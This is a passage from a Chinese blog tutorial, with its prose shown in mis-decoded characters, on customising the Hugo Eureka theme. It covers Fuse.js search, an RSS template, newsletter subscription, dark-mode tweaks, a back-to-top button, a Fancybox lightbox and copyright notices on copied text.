\u0026#34;tags\u0026#34;, weight: 0.6 }, { name: \u0026#34;catagories\u0026#34;, weight: 0.2 }, { name: \u0026#34;date\u0026#34;, weight: 0.3 }, ] }; let fuse = null async function getFuse() { if (fuse == null) { const resp = await fetch(\u0026#39;/index.json\u0026#39;, { method: \u0026#39;get\u0026#39; }) const indexData = await resp.json() fuse = new Fuse(indexData, fuseOptions); } return fuse } function render(items) { console.log(items); return items.map(item =\u0026gt; { item = item.item return ` \u0026lt;div class=\u0026#34;px-2 py-6\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col-reverse lg:flex-row justify-between\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;w-full lg:w-2/3\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;my-2\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mb-4\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;${item.permalink}\u0026#34; class=\u0026#34;font-bold text-xl hover:text-eureka\u0026#34;\u0026gt;${item.title}\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; ${item.summary} \u0026lt;p class=\u0026#34;more\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;${item.permalink}\u0026#34; title=\u0026#34;${item.title}\u0026#34;\u0026gt;é˜…è¯»å…¨æ–‡\u0026lt;span class=\u0026#34;meta-nav\u0026#34;\u0026gt;â†’\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;flex flex-wrap flex-row items-center my-2 text-tertiary-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;${item.date}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;${item.permalink}#waline-comments\u0026#34; title=\u0026#34;${item.title}\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-comment mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;${item.comments \u0026gt; 0 ? item.comments + \u0026#39; æ¡è¯„è®º\u0026#39; : \u0026#39;æš‚æ— è¯„è®º\u0026#39;}\u0026lt;/span\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-folder-open\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;${item.categories}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-tags\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;\u0026lt;b\u0026gt;${item.tags}\u0026lt;/b\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;w-full lg:w-1/3 mb-4 lg:mb-0 lg:ml-8\u0026#34;\u0026gt; ${item.featuredImage ? `\u0026lt;img src=\u0026#34;${item.featuredImage}\u0026#34; class=\u0026#34;w-full\u0026#34; alt=\u0026#34;Featured Image\u0026#34;\u0026gt;` : \u0026#39;\u0026#39;} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;`; }).join(\u0026#39;\u0026#39;); } function updateDOM(html, keyword, number) { document.title = document.title.replace(/åŒ…å«å…³é”®è¯.*?æ–‡ç« /, `åŒ…å«å…³é”®è¯ ${keyword} çš„æ–‡ç« `) searchResult.innerHTML = html searchCount.innerHTML = `å…±æŸ¥è¯¢åˆ° ${number} ç¯‡æ–‡ç« ` } async function search(searchString) { console.log(searchString); let result = []; if(searchString) { const fuse = await getFuse() result = fuse.search(searchString) } const html = render(result) updateDOM(html, searchString, result.length) } document.querySelectorAll(\u0026#39;input[name=\u0026#34;q\u0026#34;]\u0026#39;).forEach(el =\u0026gt; el.value = qs.get(\u0026#39;q\u0026#39;)); search(qs.get(\u0026#39;q\u0026#39;) || \u0026#39;\u0026#39;) window.blogSearch = function(keyword) { if(!keyword) { return; } history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, location.pathname + \u0026#39;?q=\u0026#39; + encodeURIComponent(keyword)); document.querySelectorAll(\u0026#39;input[name=\u0026#34;q\u0026#34;]\u0026#39;).forEach(el =\u0026gt; el.value = keyword); search(keyword); } }) \u0026lt;/script\u0026gt; {{ end }} ç„¶åæ–°å»ºcontent/search.mdå¡«å…¥ï¼š\n--- title: \u0026#34;æœç´¢ç»“æœ\u0026#34; sitemap: priority : 0.1 layout: \u0026#34;search\u0026#34; date: \u0026#34;2022-12-29T05:02:20+08:00\u0026#34; slug: \u0026#34;search.html\u0026#34; --- æ¥æºï¼šHugo ä¸»é¢˜ Eureka è‡ªå®šä¹‰ | æ€¡çº¢é™¢è½\nè‡ªå®šä¹‰RSSæ–‡ä»¶ è¯·åŠ¡å¿…ä¸‹è½½å¤–éƒ¨jsä»£ç ï¼\næ–°å»ºthemes/eureka/layouts/_default/rss.xmlï¼Œç„¶åå¯ä»¥å¡«å…¥goæ¨¡æ¿ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š\n{{- $page_context := cond .IsHome site . -}} {{- $pages := $page_context.RegularPages -}} {{- $limit := site.Config.Services.RSS.Limit -}} {{- if ge $limit 1 -}} {{- $pages = $pages | first $limit -}} {{- end -}} {{- printf \u0026#34;\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; encoding=\\\u0026#34;utf-8\\\u0026#34; standalone=\\\u0026#34;yes\\\u0026#34; ?\u0026gt;\u0026#34; | safeHTML }} \u0026lt;rss version=\u0026#34;2.0\u0026#34; xmlns:atom=\u0026#34;http://www.w3.org/2005/Atom\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;{{ if ne .Title site.Title }}{{ with .Title }}{{.}} | {{ end }}{{end}}{{ site.Title }}\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;{{ .Permalink }}\u0026lt;/link\u0026gt; {{- with .OutputFormats.Get \u0026#34;RSS\u0026#34; }} {{ printf \u0026#34;\u0026lt;atom:link href=%q rel=\\\u0026#34;self\\\u0026#34; type=%q /\u0026gt;\u0026#34; .Permalink .MediaType | safeHTML }} {{ end -}} \u0026lt;description\u0026gt;{{ .Title | default site.Title }}\u0026lt;/description\u0026gt; \u0026lt;generator\u0026gt;Hugo -- gohugo.io AND \u0026lt;a href=\u0026#34;https://github.com/wangchucheng/hugo-eureka/\u0026#34;\u0026gt;Eureka\u0026lt;/a\u0026gt;\u0026lt;/generator\u0026gt; {{- with site.LanguageCode }}\u0026lt;language\u0026gt;{{.}}\u0026lt;/language\u0026gt;{{end -}} {{- with site.Copyright }}\u0026lt;copyright\u0026gt;{{ replace (replace . \u0026#34;{year}\u0026#34; now.Year) \u0026#34;\u0026amp;copy;\u0026#34; \u0026#34;Â©\u0026#34; | plainify }}\u0026lt;/copyright\u0026gt;{{end -}} {{- if not .Date.IsZero }}\u0026lt;lastBuildDate\u0026gt;{{ .Date.Format \u0026#34;Mon, 02 Jan 2006 15:04:05 -0700\u0026#34; | safeHTML }}\u0026lt;/lastBuildDate\u0026gt;{{ end -}} {{ range $pages }} \u0026lt;item\u0026gt; \u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;{{ .Permalink }}\u0026lt;/link\u0026gt; \u0026lt;pubDate\u0026gt;{{ .Date.Format \u0026#34;Mon, 02 Jan 2006 15:04:05 -0700\u0026#34; | safeHTML }}\u0026lt;/pubDate\u0026gt; \u0026lt;guid\u0026gt;{{ .Permalink }}\u0026lt;/guid\u0026gt; {{ with .Description }} \u0026lt;description\u0026gt;{{ . }}\u0026lt;/description\u0026gt; {{ else }} {{if .IsPage}} \u0026lt;description\u0026gt;{{ .Summary }}\u0026lt;/description\u0026gt; {{ else }} {{ with .Site.Params.Description }} \u0026lt;description\u0026gt;{{ . }}\u0026lt;/description\u0026gt; {{ end }} {{ end }} {{ end }} \u0026lt;/item\u0026gt; {{ end }} \u0026lt;/channel\u0026gt; \u0026lt;/rss\u0026gt; å¢åŠ è®¢é˜…åŠŸèƒ½ è¯·åŠ¡å¿…ä¸‹è½½å¤–éƒ¨jsä»£ç ï¼\né¦–å…ˆï¼Œæ­¤åŠŸèƒ½è¦æ±‚ç½‘ç«™æœ‰ä¸€ä¸ªRSSæ–‡ä»¶ï¼Œä¸€èˆ¬ä¼šè‡ªåŠ¨ç”Ÿæˆä¸ºindex.xml\næ³•ä¸€ï¼šTinyLetter+Zapier ä½¿ç”¨TinyLetterçš„è·å–è®¢é˜…è€…æœåŠ¡+Zapierçš„è‡ªåŠ¨å‘ä¿¡æœåŠ¡ï¼Œå…·ä½“æ­¥éª¤è¯¦è§Newsletter for Hugo Blog - Backendology - A study of backend web development by Jared Ririe\næ³¨æ„ï¼ŒTinyLetteræ˜¯å…è´¹çš„ï¼Œä½†æ˜¯Zapierä¼¼ä¹æ˜¯ä»˜è´¹çš„ï¼ˆæœ‰è¯•ç”¨æœŸï¼‰\nä¸å»ºè®®ä½¿ç”¨TinyLetterï¼ŒåŠŸèƒ½ç®€é™‹ï¼Œä¸”æè‡ªåŠ¨åŒ–å‘é‚®ä»¶å®¹æ˜“è¢«ç³»ç»Ÿbanæ‰\næ³•äºŒï¼šä½¿ç”¨follow.it æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨æ›´è‡ªåŠ¨åŒ–ã€æ›´ä¾¿æ·çš„follow.it | Feedburner Alternative - Get more readersï¼Œæœ‰å…è´¹è®¡åˆ’ä¹Ÿæœ‰ä»˜è´¹è®¡åˆ’ï¼Œä»˜è´¹è®¡åˆ’ä»·æ ¼ä¹Ÿè¾ƒä½\nç›´æ¥æ ¹æ®å®˜ç½‘çš„æŒ‡å¼•èµ°å°±å¥½äº†ï¼Œç„¶åå®ƒå°±ä¼šè‡ªåŠ¨è§£æä½ çš„RSSé¡µé¢ï¼ˆå‰ææ˜¯ä½ è¦æœ‰RSSï¼‰ä¸­æœ€è¿‘å‘è¡¨çš„æ–‡ç« ï¼Œå¹¶å°†24å°æ—¶å†…æ›´æ–°çš„æ–‡ç« ä»¥é‚®ä»¶å½¢å¼å‘é€ç»™è®¢é˜…è€…ï¼ŒåŒæ—¶å®ƒè¿˜æœ‰ä¸€ä¸ªç±»ä¼¼äºå±•è§ˆä¸€æ ·çš„ä¸œè¥¿ï¼Œè¯»è€…å¯ä»¥ç›´æ¥ä»å®ƒçš„ç½‘ç«™å‘ç°ä½ çš„ç½‘ç«™å¹¶è¿›è¡Œè®¢é˜…ã€‚\nfollow.itåˆ†ä¸¤ç§å‘ä¿¡æ–¹å¼ï¼Œä¸€ç§æ˜¯NewsPaperï¼Œåœ¨æ¯å¤©çš„å›ºå®šæ—¶é—´å‘è®¢é˜…è€…æ¨é€æ¶ˆæ¯æˆ–é‚®ä»¶ï¼›å¦ä¸€ç§æ˜¯single emailï¼Œä¼šåœ¨æ£€æµ‹åˆ°æ–°æ–‡ç« åè‡ªåŠ¨ç”Ÿæˆé‚®ä»¶å‘é€\nfollow.itè¿˜è‡ªå¸¦RSSé˜…è¯»å™¨ï¼Œè¿™æ ·æˆ‘ä»¬çš„RSSé¡µé¢å¯ä»¥å˜çš„æ›´ç¾è§‚ï¼Œä½†æ˜¯ä¸å»ºè®®ç”¨è¿™ä¸ªé¡µé¢ä»£æ›¿æˆ‘ä»¬çš„RSSé¡µé¢ï¼Œå› ä¸ºæˆ‘ä»¬çš„RSSé¡µé¢çš„ä¿¡æ¯å¯èƒ½è¢«åˆ«çš„ç½‘ç«™é‡‡é›†å¹¶è·å–æœ€æ–°æ¶ˆæ¯ï¼Œæ‰€ä»¥ä¸å»ºè®®æ¢æ‰è¿™ä¸ªé¡µé¢\nfollow.itçš„ç¼ºç‚¹æ˜¯æœ‰æ—¶å€™å¯¹RSSçš„å˜åŒ–å“åº”ä¸å¤Ÿè¿…é€Ÿï¼Œè¿˜æœ‰å…è´¹ç‰ˆåŠŸèƒ½æ¯”è¾ƒç®€é™‹\nåœ¨åšå®¢å†…éƒ¨æŸä¸ªåœ°æ–¹æ·»åŠ è®¢é˜…å…¥å£ è®°å¾—åœ¨è‡ªå·±çš„åšå®¢å†…éƒ¨å¢åŠ ä¸€ä¸ªè¿›å…¥è®¢é˜…é¡µé¢çš„å…¥å£ï¼Œå¯ä»¥æŠŠè®¢é˜…é¡µé¢(https://tinyletter.com/\u0026lt;ä½ çš„åå­—\u0026gt;)ä¸‹è½½ä¸‹æ¥ï¼ˆå¯ä»¥è‡ªå®šä¹‰æ ·å¼ï¼‰ï¼Œæ”¾åœ¨themes/eureka/layouts/_defaultå¹¶é‡å‘½åä¸ºsubscribe.htmlï¼Œç„¶åæ–°å»º/content/subscribe/subscribe.mdå¹¶å¡«å…¥frontmatterï¼š\n--- layout: subscribe title: \u0026#34;è®¢é˜…\u0026#34; date: 2023-01-07T17:06:54+08:00 draft: false slug: \u0026#34;subscribe\u0026#34; --- ç„¶ååœ¨abouté¡µåŠ ä¸€ä¸ªå°æŒ‰é’®ï¼š\nå…·ä½“ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š\n\u0026lt;style\u0026gt; .button { font-family: å®‹ä½“,\u0026#39;Comic Sans MS\u0026#39;, cursive; color: #FFFFFF; background-color: #333333; display: inline-block; white-space: nowrap; height: 40px; line-height: 42px; margin: 0 5px 0 0; padding: 0 22px; text-decoration: none; /* text-transform: uppercase; */ text-align: center; font-weight: medium; font-style: normal; font-size: 14px; cursor: pointer; border: 0; -moz-border-radius: 4px; border-radius: 4px; -webkit-border-radius: 4px; vertical-align: top; -webkit-font-smoothing: antialiased; font-smoothing: antialiased; } \u0026lt;/style\u0026gt; \u0026lt;a href=\u0026#34;/subscribe/\u0026#34;\u0026gt;\u0026lt;button class=\u0026#34;button\u0026#34;\u0026gt;ç«‹å³è®¢é˜…ä¸ªäººåšå®¢\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; è¿˜å¯ä»¥åœ¨å„ç§åœ°æ–¹æ·»åŠ ä¸€ä¸ªå°é“ƒé“›å›¾ç‰‡ï¼Œè¿™æ ·ç”¨æˆ·æ›´å®¹æ˜“æ‰¾åˆ°ä½ çš„è®¢é˜…å…¥å£ï¼Œè€Œä¸ç”¨è¿”å›åˆ°ä¸»é¡µ\nè®©ä½ çš„åšå®¢èƒ½è¢«googleç­‰æœç´¢å¼•æ“æ‰¾åˆ° googleå¯ä»¥ä½¿ç”¨Google Search Consoleï¼Œè¯¦è§è®©Googleæœç´¢åˆ°è‡ªå·±çš„åšå®¢\nbingå¯ä»¥ä½¿ç”¨Bing Webmaster Toolsï¼Œè¯¦è§å¦‚ä½•è®“ä½ çš„ WordPress ç¶²ç«™èƒ½è¢« Bing ç´¢å¼•ï¼Ÿ | å°ç¿”æ•™ä½ SEOï¼Œæ³¨æ„bingæ˜¯å¯ä»¥å¯¼å…¥google search consoleçš„æ•°æ®çš„ï¼Œå› æ­¤å»ºè®®å…ˆè®¾ç½®google\nç™¾åº¦åŒç†ï¼Œä½¿ç”¨æ™®é€šæ”¶å½•_åŠ å¿«ç½‘ç«™å†…å®¹æŠ“å–ï¼Œå¿«é€Ÿæäº¤æ•°æ®å·¥å…·_ç«™é•¿å·¥å…·_ç½‘ç«™æ”¯æŒ_ç™¾åº¦æœç´¢èµ„æºå¹³å°\næ›´å¤šé˜…è¯»ï¼š\nHexo é…ç½®ä¸»æµæœç´¢å¼•æ“æ”¶å½•æµç¨‹è®°å½• | ä¹å›­ ä½¿é»‘è‰²å›¾ç‰‡åœ¨æ·±è‰²æ¨¡å¼ä¸‹åè½¬ä¸ºç™½è‰²å›¾ç‰‡ ä¸‹é¢æä¾›ä¸€ä¸ªç¤ºä¾‹ã€‚\næ¯”å¦‚æˆ‘åœ¨about.mdä¸­å®šä¹‰çš„å¤´åƒæ˜¯é»‘è‰²é€æ˜èƒŒæ™¯çš„ï¼Œåœ¨æ·±è‰²æ¨¡å¼ä¸‹å°±å®Œå…¨çœ‹ä¸æ¸…å›¾ç‰‡ï¼š\næˆ‘ä»¬å¯ä»¥åœ¨themes/eureka/layouts/partials/widgets/about.htmlæ–‡ä»¶å¤´éƒ¨åŠ ä¸Šï¼š\n\u0026lt;style\u0026gt; .dark .avatar{ filter: invert(100%); } \u0026lt;/style\u0026gt; ç„¶åç»™alt=\u0026quot;Avatar\u0026quot;çš„imgæ ‡ç­¾åŠ ä¸Šavatarç±»ï¼š\næ•ˆæœï¼š\nè®©æ·±æµ…é¢œè‰²å˜æ¢æ›´å¹³æ»‘ åœ¨themes/eureka/layouts/partials/head.htmlä¸­å¢åŠ ï¼š\n\u0026lt;style\u0026gt; .dark{ transition: 1.5s; } .light{ transition: 1.5s; } \u0026lt;/style\u0026gt; ç„¶åå› ä¸ºeurekaä¸»é¢˜å®ç°æ·±æµ…å˜åŒ–æ˜¯æ ¹æ®æœ‰æ²¡æœ‰darkç±»æ¥åŒºåˆ†çš„ï¼Œæ‰€ä»¥æ²¡æœ‰lightç±»ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ›´æ”¹themes/eureka/layouts/_default/baseof.htmlä¸­çš„htmlæ ‡ç­¾ï¼š\n\u0026lt;html lang=\u0026#34;{{ .Site.LanguageCode }}\u0026#34; dir=\u0026#34;{{ .Site.Language.LanguageDirection | default \u0026#34;ltr\u0026#34; }}\u0026#34; {{ if eq .Site.Params.colorScheme \u0026#34;dark\u0026#34; }}class=\u0026#34;dark\u0026#34; {{ else }} class=\u0026#34;light\u0026#34; {{ end }} \u0026gt; è¿™æ ·åœ¨æ·±æµ…ä¸»é¢˜å˜åŒ–çš„æ—¶å€™ï¼Œé¢œè‰²è¿‡æ¸¡å°±ä¼šå¹³æ»‘ä¸€ç‚¹äº†ï¼Œå…·ä½“æˆæœè§æˆ‘çš„åšå®¢\nå¢åŠ å›åˆ°å¼€å¤´æŒ‰é’® åœ¨æœ«å°¾å¢åŠ ï¼š\n\u0026lt;style\u0026gt; .black-circle{ height: 45px; width: 45px; display: block; font-size: 30px; transition: all 1.5s; position:fixed; right:0px; bottom:0px; z-index: 100; background: transparent; } .black-circle:hover{ transform: translateY(-10px); } \u0026lt;/style\u0026gt; \u0026lt;script\u0026gt; function goTop(acceleration, time) { acceleration = acceleration || 0.1; time = time || 16; var x1 = 0; var y1 = 0; var x2 = 0; var y2 = 0; var x3 = 0; var y3 = 0; if (document.documentElement) { x1 = document.documentElement.scrollLeft || 0; y1 = document.documentElement.scrollTop || 0; } if (document.body) { x2 = document.body.scrollLeft || 0; y2 = document.body.scrollTop || 0; } var x3 = window.scrollX || 0; var y3 = window.scrollY || 0; // æ»šåŠ¨æ¡åˆ°é¡µé¢é¡¶éƒ¨çš„æ°´å¹³è·ç¦» var x = Math.max(x1, Math.max(x2, x3)); // æ»šåŠ¨æ¡åˆ°é¡µé¢é¡¶éƒ¨çš„å‚ç›´è·ç¦» var y = Math.max(y1, Math.max(y2, y3)); // æ»šåŠ¨è·ç¦» = ç›®å‰è·ç¦» / é€Ÿåº¦, å› ä¸ºè·ç¦»åŸæ¥è¶Šå°, é€Ÿåº¦æ˜¯å¤§äº 1 çš„æ•°, æ‰€ä»¥æ»šåŠ¨è·ç¦»ä¼šè¶Šæ¥è¶Šå° var speed = 1 + acceleration; window.scrollTo(Math.floor(x / speed), Math.floor(y / speed)); // å¦‚æœè·ç¦»ä¸ä¸ºé›¶, ç»§ç»­è°ƒç”¨è¿­ä»£æœ¬å‡½æ•° if(x \u0026gt; 0 || y \u0026gt; 0) { var invokeFunction = goTop( acceleration , time ); window.setTimeout(invokeFunction, time); } } \u0026lt;/script\u0026gt; \u0026lt;a\u0026gt;\u0026lt;i id=\u0026#34;return-top\u0026#34; class=\u0026#34;fa-solid fa-circle-up black-circle\u0026#34; onclick=\u0026#34;goTop(0.1, 16)\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; æ„Ÿè°¢å…³äºtopæŒ‰é’®çš„ç½‘é¡µè®¾ç½® - zhunaoke - åšå®¢å›­ä¸­æä¾›çš„ä»£ç \nå…·ä½“æ•ˆæœï¼š\nå¢åŠ å›¾ç‰‡æ”¾å¤§æŸ¥çœ‹åŠŸèƒ½ æœ¬éƒ¨åˆ†çµæ„Ÿæ¥è‡ªäºHugo ä½¿ç”¨ Fancybox å®ç°å›¾ç‰‡ç¯ç®±/æ”¾å¤§åŠŸèƒ½ - atpXï¼Œå…¶ä½œè€…çµæ„Ÿæ¥è‡ªäºmaupassant-hugo/render-image.html at master Â· flysnow-org/maupassant-hugo Â· GitHubï¼Œä½†æ˜¯è¯¥æ–‡ä½œè€…çš„æ–¹æ³•ä¼¼ä¹æœ‰è¯¯ï¼Œæˆ‘æ›´æ”¹äº†ä»¥ååœ¨æˆ‘çš„é¡µé¢ä¸Šç»ˆäºå¯ä»¥ä½¿ç”¨äº†\nåœ¨params.yamlæ·»åŠ ï¼š\nfancybox : true æˆ–è€…åœ¨config.yamlæ·»åŠ ï¼š\nparams: fancybox : true ç„¶åæ–°å»ºthemes/eureka/layouts/_default/_markup/render-image.htmlï¼ˆåŒ…æ‹¬æ–‡ä»¶å¤¹ï¼‰ï¼Œæ·»åŠ ä»£ç ï¼š\n{{- $img_destination := .Destination -}} {{- if (and .Page.Site.Params.image_cdn.enable (not .Page.Site.IsServer)) -}} {{if hasPrefix .Destination \u0026#34;/\u0026#34; }} {{ $img_destination = (print .Page.Site.Params.image_cdn.HOST .Destination) }} {{ else if not (hasPrefix .Destination \u0026#34;http\u0026#34;) }} {{ $img_destination = (print .Page.Site.Params.image_cdn.HOST (path.Join .Page.RelPermalink .Destination)) }} {{ end }} {{- end -}} {{- if .Title -}} \u0026lt;figure class=\u0026#34;max-w-2xl mx-auto overflow-hidden\u0026#34;\u0026gt; {{if .Page.Site.Params.fancybox }} \u0026lt;a data-fancybox=\u0026#34;gallery\u0026#34; href=\u0026#34;{{ $img_destination | safeURL }}\u0026#34;\u0026gt; \u0026lt;img alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; {{ else }} \u0026lt;img alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; {{ end }} \u0026lt;figcaption class=\u0026#34;p-2 text-center\u0026#34;\u0026gt;{{ with $.Title | safeHTML }}{{ . }}{{ end }}\u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt; {{- else -}} {{if .Page.Site.Params.fancybox }} \u0026lt;a data-fancybox=\u0026#34;gallery\u0026#34; href=\u0026#34;{{ $img_destination | safeURL }}\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;mx-auto\u0026#34; alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; {{ else }} \u0026lt;img class=\u0026#34;mx-auto\u0026#34; alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; {{ end }} {{- end -}} âœï¸ps.è¯¥ä»£ç ä¸maupassant-hugo/render-image.html at master Â· flysnow-org/maupassant-hugo Â· GitHubçš„ä»£ç ä¸€è‡´\nåœ¨themes/eureka/layouts/partials/custom-head.htmlå¢åŠ ï¼ˆä¹Ÿå¯ä»¥åœ¨åŒç›®å½•ä¸‹çš„head.htmlæˆ–footer.htmlå¢åŠ ï¼‰ä»¥ä¸‹ä»£ç ï¼š\n{{if .Page.Site.Params.fancybox }} \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; {{ end }} ä»¥åå¦‚æœä¸æƒ³è¦å›¾ç‰‡æ”¾å¤§åŠŸèƒ½äº†ï¼Œåªç”¨æ›´æ”¹fancyboxçš„å€¼å°±å¯ä»¥äº†\nåœ¨æ–‡ç« å¼€å¤´å¢åŠ ç‰ˆæƒå£°æ˜ æˆ‘ä»¬å¸Œæœ›åœ¨è‡ªå·±åŸåˆ›çš„æ–‡ç« å¼€å¤´æ”¾ä¸€ä¸ªç‰ˆæƒå£°æ˜ï¼Œä½†æ˜¯åœ¨è‡ªå·±è½¬è½½çš„æ–‡ç« å¼€å¤´åˆä¸æ”¾ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨themes/eureka/layouts/partials/components/post-article.htmlå†…çš„{{ .Content }}ä¸Šæ–¹åŠ ä¸Šï¼š\n{{ if (or (not .Params.reprint) ( not ( in \u0026#34;true\u0026#34; .Params.reprint )) ) }} \u0026lt;b\u0026gt;\u0026lt;p\u0026gt;âš ï¸æœ¬æ–‡æ˜¯\u0026lt;a href=\u0026#34;https://github.com/PeterLiu-all\u0026#34;\u0026gt;ä½œè€…P3troL1er\u0026lt;/a\u0026gt;åŸåˆ›ï¼Œé¦–å‘äº\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;{{ .Site.BaseURL }}\u0026lt;/a\u0026gt;ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼\u0026lt;/p\u0026gt;\u0026lt;/b\u0026gt; {{ end }} å¤åˆ¶å†…å®¹è‡ªåŠ¨å¢åŠ ç‰ˆæƒä¿¡æ¯ æˆ‘ä»¬å¸Œæœ›æ‰€æœ‰å¤åˆ¶çš„æ–‡å­—å’Œhtmléƒ½åœ¨æœ«å°¾é™„ä¸Šç‰ˆæƒä¿¡æ¯è¿˜æœ‰è‡ªå·±ç½‘ç«™çš„é“¾æ¥ï¼Œä½†æ˜¯æŒ‰copyæŒ‰é’®å¤åˆ¶çš„ä»£ç å´ä¸å¸Œæœ›åŠ ä¸Šä¿¡æ¯ï¼ˆè¿™æ ·ä¼šå¾ˆéº»çƒ¦ï¼‰ï¼Œäºæ˜¯æˆ‘æ›´æ”¹äº†å¤åˆ¶ç½‘é¡µå†…å®¹è‡ªåŠ¨æ·»åŠ ç‰ˆæƒä¿¡æ¯çš„æ–¹æ³•_idjlçš„åšå®¢-CSDNåšå®¢çš„ä»£ç ï¼Œåœ¨themes/eureka/layouts/partials/custom-head.htmlæœ«å°¾åŠ ä¸Šï¼š\n\u0026lt;script language=\u0026#34;javascript\u0026#34;\u0026gt; function setClipboardText(event) { event.preventDefault();//é˜»æ­¢å…ƒç´ å‘ç”Ÿé»˜è®¤çš„è¡Œä¸ºï¼ˆä¾‹å¦‚ï¼Œå½“ç‚¹å‡»æäº¤æŒ‰é’®æ—¶é˜»æ­¢å¯¹è¡¨å•çš„æäº¤ï¼‰ã€‚ var node = document.createElement(\u0026#39;div\u0026#39;); //å¯¹documentfragmentä¸ç†Ÿï¼Œä¸çŸ¥é“æ€ä¹ˆè·å–é‡Œé¢çš„å†…å®¹ï¼Œç”¨äº†ä¸€ä¸ªæ¯”è¾ƒç¬¨çš„æ–¹å¼ node.appendChild(window.getSelection().getRangeAt(0).cloneContents()); //getRangeAt(0)è¿”å›å¯¹åŸºäºé›¶çš„æ•°å­—ç´¢å¼•ä¸ä¼ é€’å‚æ•°åŒ¹é…çš„é€‰æ‹©å¯¹è±¡ä¸­çš„èŒƒå›´çš„å¼•ç”¨ã€‚å¯¹äºè¿ç»­é€‰æ‹©ï¼Œå‚æ•°åº”ä¸ºé›¶ã€‚ var htmlData = \u0026#34;\u0026lt;div\u0026gt;\u0026#34; + node.innerHTML + \u0026#34;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;è‘—ä½œæƒå½’ä½œè€…P3troL1eræ‰€æœ‰ã€‚\u0026lt;br /\u0026gt;\u0026#34; + \u0026#34;å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…P3troL1erè·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚\u0026lt;br /\u0026gt;\u0026#34; + \u0026#39;ä½œè€…ï¼šP3troL1er\u0026lt;br /\u0026gt;é“¾æ¥ï¼š\u0026lt;a href=\u0026#34;https://peterliuzhi.top/\u0026#34;\u0026gt;https://peterliuzhi.top/\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; var textData = \u0026#34;\u0026#34; if 